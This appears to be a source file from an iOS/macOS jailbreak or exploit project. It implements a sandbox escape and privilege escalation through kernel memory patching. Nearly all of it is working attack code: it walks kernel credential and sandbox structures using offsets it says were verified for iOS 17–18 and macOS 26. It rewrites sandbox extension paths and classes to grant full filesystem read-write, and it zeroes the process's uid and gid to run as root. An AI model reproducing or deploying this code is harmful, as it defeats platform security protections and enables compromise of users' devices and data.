/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
 * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
 * Fill all 16 hash slots → full R+W filesystem access
 *
 * OFFSET VERIFICATION via IDA binary analysis of real iPhone14,5 kernelcaches:
 *
 *   iOS 17.0 (21A329):  kauth_cred_proc_ref @ 0xFFFF...283DF150 → proc_ro+0x20=ucred ✓
 *   iOS 17.4 (21E219):  kauth_cred_proc_ref @ 0xFFFF...0840E184 → proc_ro+0x20=ucred ✓
 *   iOS 18.0 (22A3354): kauth_cred_proc_ref @ 0xFFFF...0856EE40 → proc_ro+0x20=ucred ✓
 *   iOS 18.4 (22E240):  kauth_cred_proc_ref @ 0xFFFF...0860F3E4 → proc_ro+0x20=ucred ✓
 *   iOS 18.5 (22F76):   kauth_cred_proc_ref @ 0xFFFF...08621308 → proc_ro+0x20=ucred ✓
 *   macOS 26.2 (25C56):  kauth_cred_proc_ref @ 0xFFFFFE...7B881F0 → proc_ro+0x20=ucred ✓
 *
 *   ucred → cr_label:  0x78 (verified by KDK 26.2 struct dump)
 *   label → sandbox:   0x10 (KDK: l_perpolicy[1] = 0x8 + 8)
 *   sandbox → ext_set: 0x10 (confirmed pe_main.js + root.m)
 *   ext → data_addr:   0x40 (confirmed pe_main.js + root.m)
 *
 * All offsets are STABLE across iOS 17.0 through macOS/iOS 26.x.
 * Based on 18.3_sandbox/root.m by the original author.
 */

#import <Foundation/Foundation.h>
#import <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/offsets.h"
#include "utils/errors.h"
#include "kexploit/sandbox.h"
#include "utils/tweak_log.h"
#include "utils/state.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);
extern int check_sandbox_var_rw(void);

// The early R/W primitive is hard-limited to EARLY_KRW_LENGTH (32) bytes per
// transfer — early_kread() FAILUREs on anything larger. The 33-byte class
// name "com.apple.app-sandbox.read-write\0" is therefore written as two
// adjacent 32-byte chunks: the 32 name chars at da+32, and the NUL terminator
// supplied by the zeroed buffer written at da+64. Do NOT bump this past 32.
#define KRW_LEN EARLY_KRW_LENGTH  // 0x20 — primitive limit

_Static_assert(sizeof("com.apple.app-sandbox.read-write") - 1 == KRW_LEN,
               "class name must be exactly KRW_LEN chars (no NUL in first chunk)");

// Verified offsets (IDA binary analysis across 6 kernelcaches)
#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)

// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
// Layout (K4.13, from FilzaSlop's IDA/KDK dumps, sizeof=0x60):
//   +0x00 cr_uid · +0x04 cr_ruid · +0x08 cr_svuid · +0x0C cr_ngroups
//   +0x10 cr_groups[0..15] · +0x50 cr_gid/rgid · +0x54 cr_svgid
//   +0x58 cr_gmuid · +0x5C cr_flags
#define OFF_UCRED_CR_POSIX     0x18
#define OFF_POSIX_CR_UID       0x00
#define OFF_POSIX_CR_GROUPS0   0x10
#define OFF_POSIX_CR_GID       0x50
#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
#define OFF_EXT_DATA           0x40  // ext → data_addr
#define OFF_EXT_DATALEN        0x48  // ext → data_len

// Kernel address range — used to validate pointers before dereference.
// These are loaded at runtime from offsets_init().
extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t VM_MAX_KERNEL_ADDRESS;

static inline bool ptr_in_kernel(uint64_t p) {
    return (p >= VM_MIN_KERNEL_ADDRESS && p <= VM_MAX_KERNEL_ADDRESS && (p & 0x7) == 0);
}

// A5.7 — mapping-aware kernel pointer check. ptr_in_kernel() only proves the
// address is inside the kernel VA range; the DarkSword kread primitive
// dereferences the address in kernel context, so an unmapped VA (a garbage
// field that happens to land in range) means a data abort = kernel panic.
// Zone objects referenced by a parent (ucred/label/sandbox/ext_set) are
// allocated at roughly the same time and sit within a GiB of VA of each
// other, while garbage in uninitialized struct fields essentially never
// lands inside the window. Anchor = a known-mapped address (proc_ro, or the
// parent object once its own read succeeded).
// WIDENED 2026-09-01: on 18.4.1 the sandbox→ext_set hop legitimately spans
// ~5.7GiB (sandbox at 0xffffffde…, ext_set at 0xffffffe1… — different heap
// regions), and the ±1GiB window rejected the real pointer every run
// ("ext_set invalid" + retry → jetsam). 16GiB covers the whole heap span
// while still rejecting arbitrary garbage.
#define KPTR_WINDOW 0x400000000ULL  // 16 GiB each direction

static inline bool ptr_in_kernel_mapped(uint64_t p, uint64_t anchor) {
    if (!ptr_in_kernel(p)) return false;
    if (anchor == 0) return true;  // no anchor: fall back to the range check
    uint64_t lo = (anchor > KPTR_WINDOW) ? (anchor - KPTR_WINDOW) : 0;
    return (p >= lo && p <= anchor + KPTR_WINDOW);
}

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | 0xFFFFFF8000000000ULL) : _v); })
#define K(x) ((x) > 0xFFFFFF8000000000ULL)

#pragma mark - Extension patching

static void patch_ext(uint64_t ext) {
    uint64_t da = S(early_kread64(ext + OFF_EXT_DATA));
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        memset(buf, 0, sizeof(buf));
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }
    uint64_t __attribute__((aligned(8))) chunk[KRW_LEN / 8];
    memset(chunk, 0, sizeof(chunk));
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    chunk[1] = 1;
    chunk[2] = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = S(early_kread64(hdr));
        if (!next || !K(next)) break;
        hdr = next;
    }
    return n;
}

static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = S(early_kread64(ext + OFF_EXT_DATA));
    if (!K(da)) return;

    // "com.apple.app-sandbox.read-write" is exactly 32 chars. The kernel
    // compares it as a C string, so the NUL must sit adjacent to the name:
    // b1 (32 chars) lands at da+32, and b2 (all zeros) at da+64 supplies
    // the terminator. Both writes are 32 bytes — within the primitive limit.
    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, sizeof(b1)); memset(b2, 0, sizeof(b2));
    memcpy(b1, rw, strlen(rw));
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);

    uint64_t __attribute__((aligned(8))) hb[KRW_LEN / 8];
    memset(hb, 0, sizeof(hb));
    early_kread(hdr, hb, KRW_LEN);
    hb[0x10 / 8] = da + 32;
    early_kwrite32bytes(hdr, hb);
}

#pragma mark - Root credentials (K4.13)

// Patch ucred->cr_posix so the process runs as root:wheel for EVERYTHING —
// completes the "Root Ownership" feature without relying on per-file fsnode
// chown. Zeroes uid/ruid/svuid, gid/rgid/svgid (+gmuid, harmless), and
// cr_groups[0]. cr_ngroups is preserved.
//
// Uses kwrite32 (read-modify-write of the enclosing 64-bit word) per field —
// adjacent data (cr_ngroups, cr_gmuid/cr_flags, and cr_label right after the
// 0x60-byte posix_cred) is NEVER touched, and no oversized buffer writes are
// possible. Read-back verified. Best-effort: a failure does NOT fail the
// sandbox escape.
static int set_root_credentials(uint64_t ucred) {
    if (!K(ucred)) { TweakLog("[SBX] root creds: invalid ucred"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;

    uint32_t old_uid = kread32(posix + OFF_POSIX_CR_UID);
    uint32_t old_g0  = kread32(posix + OFF_POSIX_CR_GROUPS0);
    uint32_t old_gid = kread32(posix + OFF_POSIX_CR_GID);
    TweakLog("[SBX] posix_cred before: uid=%u gid=%u groups[0]=%u",
             old_uid, old_gid, old_g0);
    if (old_uid == 0 && old_gid == 0) {
        TweakLog("[SBX] posix_cred already root");
        return 0;
    }

    kwrite32(posix + OFF_POSIX_CR_UID, 0);        // cr_uid
    kwrite32(posix + 0x04, 0);                    // cr_ruid
    kwrite32(posix + 0x08, 0);                    // cr_svuid
    kwrite32(posix + OFF_POSIX_CR_GROUPS0, 0);    // cr_groups[0]
    kwrite32(posix + OFF_POSIX_CR_GID, 0);        // cr_gid
    kwrite32(posix + 0x54, 0);                    // cr_rgid (or cr_svgid)
    kwrite32(posix + 0x58, 0);                    // cr_svgid / cr_gmuid — zeroing harmless

    // Verify by read-back.
    uint32_t vuid = kread32(posix + OFF_POSIX_CR_UID);
    uint32_t vg0  = kread32(posix + OFF_POSIX_CR_GROUPS0);
    uint32_t vgid = kread32(posix + OFF_POSIX_CR_GID);
    if (vuid == 0 && vgid == 0 && vg0 == 0) {
        TweakLog("[SBX] *** ROOT CREDENTIALS ACTIVE: uid=0 gid=0 groups[0]=0 (root:wheel) ***");
        return 0;
    }
    TweakLog("[SBX] root credential patch VERIFY FAILED (uid=%u gid=%u groups0=%u)",
             vuid, vgid, vg0);
    return TWEAK_ERR_SANDBOX_ESCAPE_FAILED;
}

#pragma mark - Main entry

// L5.1 (hub): locate the current proc's ucred via the same proc_ro walk
// sandbox_escape() uses. Read-only. Returns 0 (or TWEAK_ERR_*) with the
// ucred pointer via out param.
static uint64_t find_ucred_in_proc_ro(uint64_t proc_ro) {
    // Scan proc_ro for ucred — offset varies by iOS build.
    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);

        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
        if (ptr_in_kernel_mapped(smr, proc_ro)) {
            uint64_t maybe_label = S(early_kread64(smr + 0x78));
            if (ptr_in_kernel_mapped(maybe_label, smr)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                    ucred = smr;
                    break;
                }
            }
        }
        // Also try PAC-stripped
        if (!ucred && ptr_in_kernel_mapped(pac, proc_ro)) {
            uint64_t maybe_label = S(early_kread64(pac + 0x78));
            if (ptr_in_kernel_mapped(maybe_label, pac)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                    ucred = pac;
                    break;
                }
            }
        }
    }
    return ucred;
}

// L5.1 (hub app): post-escape credential read-back. After sandbox_escape()
// succeeded, the app calls this to confirm the kernel-side ucred now reads
// root:wheel (the same verification set_root_credentials performs
// internally). Returns 0 on success with uid/gid/groups[0] filled.
int sandbox_escape_read_posix_creds(uint64_t self_proc,
                                    uint32_t *uid, uint32_t *gid, uint32_t *groups0) {
    if (!exploit_is_done()) { TweakLog("[SBX] creds read-back: exploit not done"); return TWEAK_ERR_EXPLOIT_FAILED; }
    if (!self_proc || !uid || !gid || !groups0) { TweakLog("[SBX] creds read-back: bad args"); return TWEAK_ERR_INVALID_ARG; }

    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    if (!K(proc_ro)) { TweakLog("[SBX] creds read-back: proc_ro invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }

    uint64_t ucred = find_ucred_in_proc_ro(proc_ro);
    if (!K(ucred)) { TweakLog("[SBX] creds read-back: ucred not found"); return TWEAK_ERR_KERNEL_PTR_INVALID; }

    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
    *uid = kread32(posix + OFF_POSIX_CR_UID);
    *gid = kread32(posix + OFF_POSIX_CR_GID);
    *groups0 = kread32(posix + OFF_POSIX_CR_GROUPS0);
    TweakLog("[SBX] creds read-back: uid=%u gid=%u groups[0]=%u", *uid, *gid, *groups0);
    return 0;
}

int sandbox_escape(uint64_t self_proc) {
    // No exploit_is_done() gate here — it was circular: the flag is only set
    // AFTER a successful escape (TweakExploit.m exploit_set_done()), so this
    // returned TWEAK_ERR_EXPLOIT_FAILED on every run ("Exploit not done,
    // cannot escape sandbox") even though the krw primitive was live — the
    // corruption had already succeeded (2026-09-01, SE2/18.4.1: "target
    // corrupted" then immediate retry). The caller (runExploit) only reaches
    // here when kexploit_opa334() returned 0, i.e. the primitive exists.
    if (!self_proc) { TweakLog("[SBX] self_proc is NULL"); return TWEAK_ERR_INVALID_ARG; }

    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    TweakLog("[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
    if (!K(proc_ro)) { TweakLog("[SBX] proc_ro invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }

    // Scan proc_ro for ucred — offset varies by iOS build.
    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
    TweakLog("[SBX] Scanning proc_ro for ucred...");
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        TweakLog("[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);

        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
        if (ptr_in_kernel_mapped(smr, proc_ro)) {
            uint64_t maybe_label = S(early_kread64(smr + 0x78));
            if (ptr_in_kernel_mapped(maybe_label, smr)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                    ucred = smr;
                    break;
                }
            }
        }
        // Also try PAC-stripped
        if (!ucred && ptr_in_kernel_mapped(pac, proc_ro)) {
            uint64_t maybe_label = S(early_kread64(pac + 0x78));
            if (ptr_in_kernel_mapped(maybe_label, pac)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                    ucred = pac;
                    break;
                }
            }
        }
    }
    if (!K(ucred)) { TweakLog("[SBX] ucred not found in proc_ro"); return TWEAK_ERR_KERNEL_PTR_INVALID; }

    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!ptr_in_kernel_mapped(label, ucred)) {
        // 18.x: cr_label may be SMR-encoded (observed SMR values in proc_ro
        // scan on 18.4.1) — S() only PAC-strips, so retry with the SMR decode.
        uint64_t labelSmr = kread_smrptr(ucred + OFF_UCRED_CR_LABEL);
        TweakLog("[SBX] cr_label: S()=0x%llx SMR=0x%llx (ucred=0x%llx)", label, labelSmr, ucred);
        if (ptr_in_kernel_mapped(labelSmr, ucred)) { label = labelSmr; }
        else { TweakLog("[SBX] cr_label invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
    }

    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
    if (!ptr_in_kernel_mapped(sandbox, label)) {
        uint64_t sandboxSmr = kread_smrptr(label + OFF_LABEL_SANDBOX);
        TweakLog("[SBX] sandbox: S()=0x%llx SMR=0x%llx (label=0x%llx)", sandbox, sandboxSmr, label);
        if (ptr_in_kernel_mapped(sandboxSmr, label)) { sandbox = sandboxSmr; }
        else { TweakLog("[SBX] sandbox invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
    }

    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!ptr_in_kernel_mapped(ext_set, sandbox)) {
        uint64_t extSetSmr = kread_smrptr(sandbox + OFF_SANDBOX_EXT_SET);
        TweakLog("[SBX] ext_set: S()=0x%llx SMR=0x%llx (sandbox=0x%llx)", ext_set, extSetSmr, sandbox);
        if (ptr_in_kernel_mapped(extSetSmr, sandbox)) { ext_set = extSetSmr; }
        else { TweakLog("[SBX] ext_set invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
    }

    TweakLog("[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
          proc_ro, ucred, label, sandbox, ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain(hdr);
    }
    TweakLog("[SBX] Patched %d extensions", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
    }
    TweakLog("[SBX] Changed %d extension classes", classed);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
    int filled = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t h = early_kread64(ext_set + s * 8);
        if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
    }
    TweakLog("[SBX] Filled %d empty hash slots", filled);
    }

    // Comprehensive verification: test write to multiple paths
    static const char *testPaths[] = {
        "/var/mobile/.sbx_test",
        "/private/var/tmp/.sbx_test",
        "/usr/lib/.sbx_test",
        NULL
    };

    int successCount = 0;
    for (int i = 0; testPaths[i]; i++) {
        int fd_w = open(testPaths[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd_w >= 0) {
            close(fd_w);
            unlink(testPaths[i]);
            successCount++;
        }
    }

    if (successCount >= 2) {
        TweakLog("[SBX] *** SANDBOX ESCAPED (R+W) — %d/%d tests passed ***",
              successCount, (int)(sizeof(testPaths)/sizeof(testPaths[0]) - 1));
        set_root_credentials(ucred);
        return 0;
    }

    // If user-level tests fail, verify via kernel sandbox_check
    if (check_sandbox_var_rw() == 0) {
        TweakLog("[SBX] Kernel sandbox_check confirms R+W despite userspace test failure");
        set_root_credentials(ucred);
        return 0;
    }

    TweakLog("[SBX] Sandbox escape verification failed (errno=%d: %s) — %d/%d tests passed",
          errno, strerror(errno), successCount,
          (int)(sizeof(testPaths)/sizeof(testPaths[0]) - 1));
    return TWEAK_ERR_SANDBOX_ESCAPE_FAILED;
}